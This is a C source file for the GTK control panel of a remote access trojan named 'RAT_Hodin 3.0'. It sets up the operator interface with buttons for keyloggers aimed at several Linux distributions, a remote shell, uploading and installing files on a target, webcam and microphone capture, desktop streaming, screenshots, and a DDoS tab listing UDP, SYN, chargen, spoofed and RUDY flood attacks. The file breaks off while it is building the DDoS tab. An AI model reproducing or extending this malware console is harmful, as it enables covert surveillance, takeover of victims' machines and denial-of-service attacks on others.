#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>  //gethostbyaddr()

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>

#include <gtk-2.0/gtk/gtk.h>
#include <gst/gst.h>

#include "../includes/constants.h"
#include "../includes/callbacks_main.h"
#include "../includes/downloader.h"
#include "../includes/callbacks_keyloggers.h"
#include "../includes/callbacks_remote_shell.h"
#include "../includes/callbacks_ddos.h"
#include "../includes/callbacks_rudy_arme_ddos.h"
#include "../includes/callbacks_execute_commands.h"
#include "../includes/callbacks_gather_infos.h"

GtkWidget *main_win = NULL;
GtkWidget *text_view = NULL;
GtkWidget *rs_text_view = NULL;
GtkWidget *ddos_text_view = NULL;
GtkWidget *historic_text_view = NULL;
GtkWidget *remote_shell_command_entry = NULL;
GtkWidget *upload_entry;
GtkWidget *zone[4] = {NULL};

GtkWidget *hostname_text_view = NULL;
GtkWidget *architecture_text_view = NULL;
GtkWidget *os_text_view = NULL;
GtkWidget *os_bits_text_view = NULL;
GtkWidget *ip_text_view = NULL;
GtkWidget *memory_text_view;


int main(int argc, char *argv[])
{
    /* Initialize GTK */
    gtk_init(&argc, &argv);

    /* Initialize GStreamer */
    gst_init (&argc, &argv);

    main_win = gtk_window_new(GTK_WINDOW_TOPLEVEL);
    gtk_window_set_title(GTK_WINDOW(main_win), "RAT_Hodin 3.0");
    gtk_window_set_default_size(GTK_WINDOW(main_win), 1024, 576);
    gtk_window_set_resizable(GTK_WINDOW(main_win), FALSE);
    g_signal_connect(main_win, "destroy", gtk_main_quit, NULL);

    fill_window(argc, argv);

    gtk_widget_show_all(main_win);

    gtk_main();

    return EXIT_SUCCESS;
}

void fill_window(int argc, char *argv[])
{
    /** Tabs vars **/
    GtkWidget *note_book = NULL;
    GtkWidget *tab_label[5] = {NULL};
    GtkWidget *background[5] = {NULL};
    GtkWidget *image_decoration[8] = {NULL};
    GtkWidget *texte_decoration = NULL;


    GtkWidget *main_setup_label;
    gchar *utf8_main_setup;

    GtkWidget *main_download_label;
    gchar *utf8_main_download;

    GtkWidget *main_log_label;
    gchar *utf8_main_log;

    GtkWidget *keyloggers_label;
    gchar *utf8_keyloggers;

    GtkWidget *execute_commands_label;
    gchar *utf8_execute_commands;

    GtkWidget *attacks_log_label;
    gchar *utf8_logs_attacks;

    GtkWidget *remote_start_end_label;
    gchar *utf8_remote_shell_start_end;

    GtkWidget *remote_shell_log_label;
    gchar *utf8_remote_shell_log;

    gchar *main_tab_label = NULL;
    gchar *remote_shell_tab_label = NULL;
    gchar *ddos_tab_label = NULL;
    gchar *gather_infos_tab_label = NULL;
    gchar *credits_tab_label = NULL;

    /** General Vars **/
    GtkWidget *frame[14] = {NULL};

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;

    /** All buttons **/
    GtkWidget *ip_server = NULL;
    GtkWidget *port_server = NULL;
    GtkWidget *IP_button = NULL;
    GtkWidget *port_button = NULL;

    //GtkWidget *upload_entry = NULL;
    //GtkWidget *browse_button = NULL;
    GtkWidget *upload_files = NULL;
    GtkWidget *download_files = NULL;
    GtkWidget *download_binaries = NULL;

    /** Keylogger Vars **/
    GtkWidget *run_keylogger = NULL;
    GtkWidget *exit_keylogger_button = NULL;
    GtkWidget *log_file = NULL;
    //GtkWidget *close_keylogger = NULL;

    /** Logs View vars **/
    //GtkWidget *text_view = NULL;
    GtkWidget *scrollbar = NULL;

    /** DDOS vars **/
    //GtkWidget *ddos_text_view = NULL;
    GtkWidget *ddos_scrollbar = NULL;

    GtkWidget *run_udp_script_1 = NULL;
    GtkWidget *run_udp_script_2 = NULL;
    GtkWidget *run_udp_lag_script = NULL;
    GtkWidget *valve_source_engine_ddos = NULL;

    GtkWidget *ssyn_send_script = NULL;
    GtkWidget *essyn_send_script = NULL;
    GtkWidget *chargen_send_script = NULL;
    GtkWidget *udp_spoofed_script = NULL;

    GtkWidget *rudy_send_script = NULL;
    GtkWidget *arme_send_script = NULL;
    /*
    GtkWidget *get_send_script = NULL;
    GtkWidget *head_send_script = NULL;
    GtkWidget *post_send_script = NULL;

    GtkWidget *slowloris_send_script = NULL;
    */

    /** Hosts file **/
    GtkWidget *download_hosts_files = NULL;
    GtkWidget *open_hosts_files = NULL;

    /** Remote shell vars **/
    //GtkWidget *remote_shell_command_entry = NULL;
    GtkWidget *remote_shell_start = NULL;
    GtkWidget *remote_shell_stop = NULL;
    GtkWidget *remote_shell_send_command = NULL;
    char *quit_remote_shell_cmd = NULL;

    GtkWidget *definition_text_view_2 = NULL;

    GtkWidget *rs_scrollbar = NULL;
    GtkWidget *rs_scrollbar_2 = NULL;
    GtkWidget *rs_historic_scrollbar = NULL;

    /** Execute Commands Vars **/
    GtkWidget *remote_desktop = NULL;
    GtkWidget *stream_webcam = NULL;
    GtkWidget *record_webcam = NULL;
    GtkWidget *record_micro = NULL;

    GtkWidget *take_screenshot = NULL;
    GtkWidget *multi_take_screenshot = NULL;

    char *IP = "";

    /** Initialize all the zone[n] for blit widgets **/
    zone[0] = gtk_fixed_new();
    zone[1] = gtk_fixed_new();
    zone[2] = gtk_fixed_new();
    zone[3] = gtk_fixed_new();
    zone[4] = gtk_fixed_new();

    /**  Creating tabs **/
    note_book = gtk_notebook_new();
    gtk_container_add(GTK_CONTAINER(main_win), note_book);
    gtk_notebook_set_tab_pos(GTK_NOTEBOOK(note_book), GTK_POS_TOP);

    /** Creating tab's labels name **/
    main_tab_label = g_strdup_printf("Main");
    remote_shell_tab_label = g_strdup_printf("Remote Shell");
    ddos_tab_label = g_strdup_printf("DDOS");
    gather_infos_tab_label = g_strdup_printf("Gather_infos");
    credits_tab_label = g_strdup_printf("Crédits");

    /** Load all decoration images **/
    background[0] = gtk_image_new_from_file("images/BG_2.jpg");
    background[1] = gtk_image_new_from_file("images/BG_6.jpg");
    background[2] = gtk_image_new_from_file("images/BG_3.jpg");
    background[3] = gtk_image_new_from_file("images/BG_16.jpeg");
    background[4] = gtk_image_new_from_file("images/BG_1.jpg");

    image_decoration[0] = gtk_image_new_from_file("images/RAT_hodin.png");
    image_decoration[1] = gtk_image_new_from_file("images/By Thibault.png");

    image_decoration[2] = gtk_image_new_from_file("images/RAT_hodin.png");
    image_decoration[3] = gtk_image_new_from_file("images/By Thibault.png");

    image_decoration[4] = gtk_image_new_from_file("images/RAT_hodin.png");
    image_decoration[5] = gtk_image_new_from_file("images/By Thibault.png");

    image_decoration[6] = gtk_image_new_from_file("images/RAT_hodin.png");
    image_decoration[7] = gtk_image_new_from_file("images/By Thibault.png");

    texte_decoration = gtk_image_new_from_file("images/Celtic14.png");
    //texte_decoration[1] = gtk_image_new_from_file("images/Celtic15.png");

    /** Creating all tabs labels **/
    tab_label[0] = gtk_label_new(main_tab_label);
    tab_label[1] = gtk_label_new(remote_shell_tab_label);
    tab_label[2] = gtk_label_new(ddos_tab_label);
    tab_label[3] = gtk_label_new(gather_infos_tab_label);
    tab_label[4] = gtk_label_new(credits_tab_label);

    /** Insert each tab on each page **/
    gtk_notebook_append_page(GTK_NOTEBOOK(note_book), zone[0], tab_label[0]);
    gtk_notebook_append_page(GTK_NOTEBOOK(note_book), zone[1], tab_label[1]);
    gtk_notebook_append_page(GTK_NOTEBOOK(note_book), zone[2], tab_label[2]);
    gtk_notebook_append_page(GTK_NOTEBOOK(note_book), zone[3], tab_label[3]);
    gtk_notebook_append_page(GTK_NOTEBOOK(note_book), zone[4], tab_label[4]);

    /** Insert background for each tab on each page **/
    gtk_fixed_put(GTK_FIXED(zone[0]), background[0], 0, 0);
    gtk_fixed_put(GTK_FIXED(zone[1]), background[1], 0, 0);
    gtk_fixed_put(GTK_FIXED(zone[2]), background[2], 0, 0);
    gtk_fixed_put(GTK_FIXED(zone[3]), background[3], 0, 0);
    gtk_fixed_put(GTK_FIXED(zone[4]), background[4], 0, 0);

    /** Insert image for each tab and on each page **/
    /* zone[0] = Main */
    gtk_fixed_put(GTK_FIXED(zone[0]), image_decoration[0], 810, 490);
    gtk_fixed_put(GTK_FIXED(zone[0]), image_decoration[1], 835, 520);

    /* zone[1] = Remote shell */
    gtk_fixed_put(GTK_FIXED(zone[1]), image_decoration[2], 430, 350);
    gtk_fixed_put(GTK_FIXED(zone[1]), image_decoration[3], 440, 400);

    /* zone[2] = DDOS */
    gtk_fixed_put(GTK_FIXED(zone[2]), image_decoration[4], 760, 240);
    gtk_fixed_put(GTK_FIXED(zone[2]), image_decoration[5], 830, 295);

    /* zone[3] = Gather infos */
    gtk_fixed_put(GTK_FIXED(zone[3]), image_decoration[6], 810, 490);
    gtk_fixed_put(GTK_FIXED(zone[3]), image_decoration[7], 840, 520);

    /** Insert text decoration **/
    gtk_fixed_put(GTK_FIXED(zone[0]), texte_decoration, 827, 355);
    //gtk_fixed_put(GTK_FIXED(zone[2]), texte_decoration[1], 820, 400);

    /** TAB : Main **/
    /** Frame 0 : setup / upload / install **/
    main_setup_label = gtk_label_new(NULL);
    //gchar *utf8_main_setup;

    utf8_main_setup = g_locale_to_utf8("<span foreground=\"#ffffff\">Setup / Upload / Install</span>\n", -1, NULL, NULL, NULL);
    gtk_label_set_markup(GTK_LABEL(main_setup_label), utf8_main_setup);
    gtk_fixed_put(GTK_FIXED(zone[0]), main_setup_label, 220, 10);

    frame[0] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[0]), "                                                 ");
    gtk_frame_set_label_align(GTK_FRAME(frame[0]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[0]), GTK_SHADOW_OUT);
    gtk_widget_set_usize(frame[0], 480, 200);
    gtk_fixed_put(GTK_FIXED(zone[0]), frame[0], 200, 10);

    upload_entry = gtk_entry_new_with_max_length(256);
    gtk_entry_set_text(GTK_ENTRY(upload_entry), "File To Upload / App. to Install");
    gtk_widget_set_size_request(upload_entry, 250, 34);
    gtk_fixed_put(GTK_FIXED(zone[0]), upload_entry, 210, 150);

    ip_server = gtk_entry_new_with_max_length(strlen("255.255.255.255"));
    gtk_entry_set_text(GTK_ENTRY(ip_server), "Server IP");
    gtk_widget_set_size_request(ip_server, 130, 31);
    gtk_fixed_put(GTK_FIXED(zone[0]), ip_server, 340, 48);

    IP_button = gtk_button_new_with_label("Set Server IP");
    gtk_widget_set_size_request(IP_button, 120, 34);
    gtk_fixed_put(GTK_FIXED(zone[0]), IP_button, 210, 47);
    g_signal_connect(G_OBJECT(IP_button), "clicked", G_CALLBACK(cb_get_server_ip), ip_server);

    port_server = gtk_entry_new_with_max_length(strlen("99999"));
    gtk_entry_set_text(GTK_ENTRY(port_server), "4444");
    gtk_widget_set_size_request(port_server, 130, 31);
    gtk_fixed_put(GTK_FIXED(zone[0]), port_server, 340, 98);

    port_button = gtk_button_new_with_label("Set Port");
    gtk_widget_set_size_request(port_button, 120, 34);
    gtk_fixed_put(GTK_FIXED(zone[0]), port_button, 210, 98);
    g_signal_connect(G_OBJECT(port_button), "clicked", G_CALLBACK(cb_get_server_port), port_server);

    upload_files = gtk_button_new_with_label("Browse");
    gtk_widget_set_size_request(upload_files, 80, 34);
    gtk_fixed_put(GTK_FIXED(zone[0]), upload_files, 464, 150);
    g_signal_connect(G_OBJECT(upload_files), "clicked", G_CALLBACK(cb_open_file), NULL);

    upload_files = gtk_button_new_with_label("Upload / Install");
    gtk_widget_set_size_request(upload_files, 120, 34);
    gtk_fixed_put(GTK_FIXED(zone[0]), upload_files, 546, 150);
    g_signal_connect(G_OBJECT(upload_files), "clicked", G_CALLBACK(cb_files_uploader), upload_entry);

    /** Frame 2 :  Main downloading **/
    main_download_label = gtk_label_new(NULL);
    //gchar *utf8_main_download;

    utf8_main_download = g_locale_to_utf8("<span foreground=\"#ffffff\">Downloading</span>\n", -1, NULL, NULL, NULL);
    gtk_label_set_markup(GTK_LABEL(main_download_label), utf8_main_download);
    gtk_fixed_put(GTK_FIXED(zone[0]), main_download_label, 20, 10);

    frame[2] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[2]), "                               ");
    gtk_frame_set_label_align(GTK_FRAME(frame[2]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[2]), GTK_SHADOW_OUT);
    gtk_widget_set_usize(frame[2], 180, 200);
    gtk_fixed_put(GTK_FIXED(zone[0]), frame[2], 10, 10);

    download_files = gtk_button_new_with_label("Download Text File");
    gtk_widget_set_size_request(download_files, 150, 34);
    gtk_fixed_put(GTK_FIXED(zone[0]), download_files, 25, 40);
    g_signal_connect(G_OBJECT(download_files), "clicked", G_CALLBACK(cb_files_downloader), NULL);

    download_binaries = gtk_button_new_with_label("Download Binary");
    gtk_widget_set_size_request(download_binaries, 150, 34);
    gtk_fixed_put(GTK_FIXED(zone[0]), download_binaries, 25, 80);
    g_signal_connect(G_OBJECT(download_binaries), "clicked", G_CALLBACK(cb_binaries_downloader), NULL);

    download_hosts_files = gtk_button_new_with_label("Download Hosts");
    gtk_widget_set_size_request(download_hosts_files, 150, 34);
    gtk_fixed_put(GTK_FIXED(zone[0]), download_hosts_files, 25, 120);
    g_signal_connect(G_OBJECT(download_hosts_files), "clicked", G_CALLBACK(cb_hosts_downloader), NULL);

    open_hosts_files = gtk_button_new_with_label("Open Files");
    gtk_widget_set_size_request(open_hosts_files, 150, 34);
    gtk_fixed_put(GTK_FIXED(zone[0]), open_hosts_files, 25, 160);
    g_signal_connect(G_OBJECT(open_hosts_files), "clicked", G_CALLBACK(cb_open_hosts), argv[0]);

    /** Frame 3 : Keyloggers **/
    keyloggers_label = gtk_label_new(NULL);
    //gchar *utf8_keyloggers;

    utf8_keyloggers = g_locale_to_utf8("<span foreground=\"#ffffff\">Keyloggers</span>\n", -1, NULL, NULL, NULL);
    gtk_label_set_markup(GTK_LABEL(keyloggers_label), utf8_keyloggers);
    gtk_fixed_put(GTK_FIXED(zone[0]), keyloggers_label, 23, 220);

    frame[3] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[3]), "                          ");
    gtk_frame_set_label_align(GTK_FRAME(frame[3]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[3]), GTK_SHADOW_OUT);
    gtk_widget_set_usize(frame[3], 230, 350);
    gtk_fixed_put(GTK_FIXED(zone[0]), frame[3], 10, 220);

    exit_keylogger_button = gtk_button_new_with_label("Exit Keylogger");
    gtk_widget_set_size_request(exit_keylogger_button, 174, 34);
    gtk_fixed_put(GTK_FIXED(zone[0]), exit_keylogger_button, 38, 480);
    g_signal_connect(G_OBJECT(exit_keylogger_button), "clicked", G_CALLBACK(cb_exit_the_keylogger), NULL);

    run_keylogger = gtk_button_new_with_label("Ubuntu 24 Keylogger");
    gtk_widget_set_size_request(run_keylogger, 174, 34);
    gtk_fixed_put(GTK_FIXED(zone[0]), run_keylogger, 38, 260);
    g_signal_connect(G_OBJECT(run_keylogger), "clicked", G_CALLBACK(cb_ubuntu24_run_the_keylogger), NULL);

    run_keylogger = gtk_button_new_with_label("Mint 22 Keylogger");
    gtk_widget_set_size_request(run_keylogger, 174, 34);
    gtk_fixed_put(GTK_FIXED(zone[0]), run_keylogger, 38, 300);
    g_signal_connect(G_OBJECT(run_keylogger), "clicked", G_CALLBACK(cb_mint_run_the_keylogger), NULL);

    run_keylogger = gtk_button_new_with_label("Debian 12.6 Keylogger");
    gtk_widget_set_size_request(run_keylogger, 174, 34);
    gtk_fixed_put(GTK_FIXED(zone[0]), run_keylogger, 38, 340);
    g_signal_connect(G_OBJECT(run_keylogger), "clicked", G_CALLBACK(cb_debian_run_the_keylogger), NULL);

    run_keylogger = gtk_button_new_with_label("Kali 2024 Keylogger");
    gtk_widget_set_size_request(run_keylogger, 174, 34);
    gtk_fixed_put(GTK_FIXED(zone[0]), run_keylogger, 38, 380);
    g_signal_connect(G_OBJECT(run_keylogger), "clicked", G_CALLBACK(cb_kali_run_the_keylogger), NULL);

    run_keylogger = gtk_button_new_with_label("Fedora 40 Keylogger");
    gtk_widget_set_size_request(run_keylogger, 174, 34);
    gtk_fixed_put(GTK_FIXED(zone[0]), run_keylogger, 38, 420);
    g_signal_connect(G_OBJECT(run_keylogger), "clicked", G_CALLBACK(cb_fedora_run_the_keylogger), NULL);

    log_file = gtk_button_new_with_label("Logs file");
    gtk_widget_set_size_request(log_file, 174, 34);
    gtk_fixed_put(GTK_FIXED(zone[0]), log_file, 38, 520);
    g_signal_connect(G_OBJECT(log_file), "clicked", G_CALLBACK(cb_download_log_file), NULL); //argv[0] ????

    /** Frame 4 : main Logs **/
    main_log_label = gtk_label_new(NULL);
    //gchar *utf8_main_log;

    utf8_main_log = g_locale_to_utf8("<span foreground=\"#ffffff\">Logs</span>\n", -1, NULL, NULL, NULL);
    gtk_label_set_markup(GTK_LABEL(main_log_label), utf8_main_log);
    gtk_fixed_put(GTK_FIXED(zone[0]), main_log_label, 280, 330);

    frame[4] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[4]), "            ");
    gtk_frame_set_label_align(GTK_FRAME(frame[4]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[4]), GTK_SHADOW_OUT);
    gtk_widget_set_usize(frame[4], 491, 240);
    gtk_fixed_put(GTK_FIXED(zone[0]), frame[4], 250, 330);

    // scrolled window on the side of the windows
    scrollbar = gtk_scrolled_window_new(NULL, NULL);
    gtk_widget_set_size_request(scrollbar, 472, 210);
    gtk_fixed_put(GTK_FIXED(zone[0]), scrollbar, 260, 350);

    // Side window (log)
    text_view = gtk_text_view_new();
    gtk_container_add(GTK_CONTAINER(scrollbar), text_view);
    gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW(scrollbar), GTK_POLICY_AUTOMATIC, GTK_POLICY_AUTOMATIC);
    //gtk_widget_set_size_request(text_view, 320, 400);

    /** Frame 5 : Execute Commands **/
    execute_commands_label = gtk_label_new(NULL);
    //gchar *utf8_execute_commands;

    utf8_execute_commands = g_locale_to_utf8("<span foreground=\"#ffffff\">Execute Commands</span>\n", -1, NULL, NULL, NULL);
    gtk_label_set_markup(GTK_LABEL(execute_commands_label), utf8_execute_commands);
    gtk_fixed_put(GTK_FIXED(zone[0]), execute_commands_label, 762, 10);

    frame[5] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[5]), "                                             ");
    gtk_frame_set_label_align(GTK_FRAME(frame[5]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[5]), GTK_SHADOW_OUT);
    gtk_widget_set_usize(frame[5], 260, 350);
    gtk_fixed_put(GTK_FIXED(zone[0]), frame[5], 750, 10);

    remote_desktop = gtk_button_new_with_label("Stream Remote Desktop.");
    gtk_widget_set_size_request(remote_desktop, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[0]), remote_desktop, 780, 50);
    g_signal_connect(G_OBJECT(remote_desktop), "clicked", G_CALLBACK(cb_stream_remote_desktop), IP);

    stream_webcam = gtk_button_new_with_label("Stream The WebCam.");
    gtk_widget_set_size_request(stream_webcam, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[0]), stream_webcam, 780, 100);
    g_signal_connect(G_OBJECT(stream_webcam), "clicked", G_CALLBACK(cb_stream_remote_webcam), IP);

    record_webcam = gtk_button_new_with_label("Record The WebCam.");
    gtk_widget_set_size_request(record_webcam, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[0]), record_webcam, 780, 150);
    //g_signal_connect(G_OBJECT(record_webcam), "clicked", G_CALLBACK(cb_record_webcam), NULL);

    record_micro = gtk_button_new_with_label("Record The Microphone.");
    gtk_widget_set_size_request(record_micro, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[0]), record_micro, 780, 200);
    //g_signal_connect(G_OBJECT(record_micro), "clicked", G_CALLBACK(cb_record_micro), NULL);

    take_screenshot = gtk_button_new_with_label("Take Screenshot");
    gtk_widget_set_size_request(take_screenshot, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[0]), take_screenshot, 780, 250);
    g_signal_connect(G_OBJECT(take_screenshot), "clicked", G_CALLBACK(cb_take_screenshot), NULL);

    multi_take_screenshot = gtk_button_new_with_label("Take Multi Screenshots");
    gtk_widget_set_size_request(multi_take_screenshot, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[0]), multi_take_screenshot, 780, 300);
    g_signal_connect(G_OBJECT(multi_take_screenshot), "clicked", G_CALLBACK(cb_multi_screenshot), NULL);

    /** TAB : Remote Shell **/
    /** Frame 6 : Remote Shell Start / Command / Send) **/
    remote_start_end_label = gtk_label_new(NULL);
    //gchar *utf8_remote_shell_start_end;

    utf8_remote_shell_start_end = g_locale_to_utf8("<span foreground=\"#ffffff\">Start / Command / Send</span>\n", -1, NULL, NULL, NULL);
    gtk_label_set_markup(GTK_LABEL(remote_start_end_label), utf8_remote_shell_start_end);
    gtk_fixed_put(GTK_FIXED(zone[1]), remote_start_end_label, 40, 15);

    frame[6] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[6]), "                                                       ");
    gtk_frame_set_label_align(GTK_FRAME(frame[6]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[6]), GTK_SHADOW_OUT);
    gtk_widget_set_usize(frame[6], 420, 150);
    gtk_fixed_put(GTK_FIXED(zone[1]), frame[6], 20, 15);

    /** Frame 7 : Remote shell logs **/
    remote_shell_log_label = gtk_label_new(NULL);

    utf8_remote_shell_log = g_locale_to_utf8("<span foreground=\"#ffffff\">Logs</span>\n", -1, NULL, NULL, NULL);
    gtk_label_set_markup(GTK_LABEL(remote_shell_log_label), utf8_remote_shell_log);
    gtk_fixed_put(GTK_FIXED(zone[1]), remote_shell_log_label, 661, 15);

    frame[7] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[7]), "           ");
    gtk_frame_set_label_align(GTK_FRAME(frame[7]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[7]), GTK_SHADOW_OUT);
    gtk_widget_set_usize(frame[7], 370, 450);
    gtk_fixed_put(GTK_FIXED(zone[1]), frame[7], 640, 15);

    // scrolled window on the side of the windows
    rs_scrollbar = gtk_scrolled_window_new(NULL, NULL);
    gtk_widget_set_size_request(rs_scrollbar, 350, 410);
    gtk_fixed_put(GTK_FIXED(zone[1]), rs_scrollbar, 650, 40);

    // Side window (log)
    rs_text_view = gtk_text_view_new();
    gtk_text_view_set_editable((GtkTextView*)rs_text_view, FALSE);
    gtk_text_view_set_cursor_visible((GtkTextView*)rs_text_view, TRUE);
    gtk_widget_set_size_request(rs_text_view, 320, 360);

    gtk_container_add(GTK_CONTAINER(rs_scrollbar), rs_text_view);
    gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW(rs_scrollbar), GTK_POLICY_AUTOMATIC, GTK_POLICY_AUTOMATIC);

    /** Frame 8 : remote shell commands historic **/
    GtkWidget *historic_log_label = gtk_label_new(NULL);
    gchar *utf8_historic_log;

    utf8_historic_log = g_locale_to_utf8("<span foreground=\"#ffffff\">Historic</span>\n", -1, NULL, NULL, NULL);
    gtk_label_set_markup(GTK_LABEL(historic_log_label), utf8_historic_log);
    gtk_fixed_put(GTK_FIXED(zone[1]), historic_log_label, 38, 373);

    frame[8] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[8]), "                    ");
    gtk_frame_set_label_align(GTK_FRAME(frame[8]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[8]), GTK_SHADOW_OUT);
    gtk_widget_set_usize(frame[8], 345, 180);
    gtk_fixed_put(GTK_FIXED(zone[1]), frame[8], 20, 373);

    // scrolled window on the side of the windows
    rs_historic_scrollbar = gtk_scrolled_window_new(NULL, NULL);
    gtk_widget_set_size_request(rs_historic_scrollbar, 325, 145);
    gtk_fixed_put(GTK_FIXED(zone[1]), rs_historic_scrollbar, 30, 395);

    historic_text_view = gtk_text_view_new();
    gtk_text_view_set_editable((GtkTextView*)historic_text_view, FALSE);
    gtk_text_view_set_cursor_visible((GtkTextView*)historic_text_view, TRUE);
    //gtk_widget_set_size_request(rs_text_view, 320, 400);
    gtk_container_add(GTK_CONTAINER(rs_historic_scrollbar), historic_text_view);
    gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW(rs_historic_scrollbar), GTK_POLICY_AUTOMATIC, GTK_POLICY_AUTOMATIC);
    //gtk_widget_set_size_request(rs_text_view_2, 320, 400);

    /** Frame 9 : Remote shell définition **/
    GtkWidget *remote_shell_definition_label = gtk_label_new(NULL);
    gchar *utf8_remote_shell_definition;

    utf8_remote_shell_definition = g_locale_to_utf8("<span foreground=\"#ffffff\">Définition</span>\n", -1, NULL, NULL, NULL);
    gtk_label_set_markup(GTK_LABEL(remote_shell_definition_label), utf8_remote_shell_definition);
    gtk_fixed_put(GTK_FIXED(zone[1]), remote_shell_definition_label, 40, 180);

    frame[9] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[9]), "                        ");
    gtk_frame_set_label_align(GTK_FRAME(frame[9]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[9]), GTK_SHADOW_OUT);
    gtk_widget_set_usize(frame[9], 345, 180);
    gtk_fixed_put(GTK_FIXED(zone[1]), frame[9], 20, 180);

    /** Definition scrolled window **/
    rs_scrollbar_2 = gtk_scrolled_window_new(NULL, NULL);
    gtk_widget_set_size_request(rs_scrollbar_2, 325, 150);
    gtk_fixed_put(GTK_FIXED(zone[1]), rs_scrollbar_2, 30, 200);

    /** Definition window **/
    definition_text_view_2 = gtk_text_view_new();
    gtk_text_view_set_editable((GtkTextView*)definition_text_view_2, FALSE);
    gtk_text_view_set_cursor_visible((GtkTextView*)definition_text_view_2, FALSE);

    gtk_container_add(GTK_CONTAINER(rs_scrollbar_2), definition_text_view_2);
    gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW(rs_scrollbar_2), GTK_POLICY_AUTOMATIC, GTK_POLICY_AUTOMATIC);
    //gtk_widget_set_size_request(rs_text_view_2, 320, 400);

    /** Remote shell definition **/
    /** Obtaining the buffer associated with the widget. **/
    text_buffer = gtk_text_view_get_buffer((GtkTextView*)definition_text_view_2);

    /** Set the default buffer text. **/
    gtk_text_buffer_set_text(text_buffer, "\n\t\"The remote shell (rsh) is a command line\n\
\tcomputer program that can execute shell\n\
\tcommands as another user, and on another\n\
\tcomputer across a computer network.\"\n\n\t\t\t\t\t\t\t\t\t[ Wikipedia ]", -1);

    /** Obtain iters for the start and end of points of the buffer **/
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /** Get the entire buffer text. **/
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /** Print the text **/
    g_print("%s", text);
    g_free(text);

    /* GtkEntry for enter the commands */
    remote_shell_command_entry = gtk_entry_new_with_max_length(256);
    gtk_entry_set_text(GTK_ENTRY(remote_shell_command_entry), "Use quit command for exit ...");
    gtk_widget_set_size_request (remote_shell_command_entry, 240, 30);
    gtk_fixed_put(GTK_FIXED(zone[1]), remote_shell_command_entry, 50, 50);

    /* Start Remote Shell Button */
    remote_shell_start =  gtk_button_new_with_label("Start the Remote Shell");
    gtk_widget_set_size_request(remote_shell_start, 180, 30);
    gtk_fixed_put(GTK_FIXED(zone[1]), remote_shell_start, 50, 110);
    g_signal_connect(G_OBJECT(remote_shell_start), "clicked", G_CALLBACK(cb_start_remote_shell), NULL);

    /* Send button */
    remote_shell_send_command = gtk_button_new_with_label("Send");
    gtk_widget_set_size_request(remote_shell_send_command, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone[1]), remote_shell_send_command, 310, 50);
    g_signal_connect(G_OBJECT(remote_shell_send_command), "clicked", G_CALLBACK(cb_send_cmd), remote_shell_command_entry);

    /* Stop Remote Shell Button */
    quit_remote_shell_cmd = malloc(5 * sizeof(char));
    if(quit_remote_shell_cmd == NULL)
    {
        error("malloc quit_remote_shell_cmd", "fill_window()");
        return;
    }
    strncpy(quit_remote_shell_cmd, "quit", strlen("quit") + 1);

    printf("\n\nquit_cmd = %s\n", quit_remote_shell_cmd);

    remote_shell_stop =  gtk_button_new_with_label("Stop the Remote Shell");
    gtk_widget_set_size_request(remote_shell_stop, 180, 30);
    gtk_fixed_put(GTK_FIXED(zone[1]), remote_shell_stop, 240, 110);
    g_signal_connect(G_OBJECT(remote_shell_stop), "clicked", G_CALLBACK(cb_stop_remote_shell), quit_remote_shell_cmd);

    /** TAB : DDOS **/
    /** Frame 10 : Général attacks **/
    GtkWidget *general_attacks_label = gtk_label_new(NULL);
    gchar *utf8_general_attacks;

    utf8_general_attacks = g_locale_to_utf8("<span foreground=\"#ffffff\">General Attacks</span>\n", -1, NULL, NULL, NULL);
    gtk_label_set_markup(GTK_LABEL(general_attacks_label), utf8_general_attacks);
    gtk_fixed_put(GTK_FIXED(zone[2]), general_attacks_label, 113, 10);

    frame[10] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[10]), "                                     ");
    gtk_frame_set_label_align(GTK_FRAME(frame[10]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[10]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(frame[10], 230, 250);
    gtk_fixed_put(GTK_FIXED(zone[2]), frame[10], 100, 10);

    run_udp_script_1 = gtk_button_new_with_label("UDP BASIC 1 DDOS");
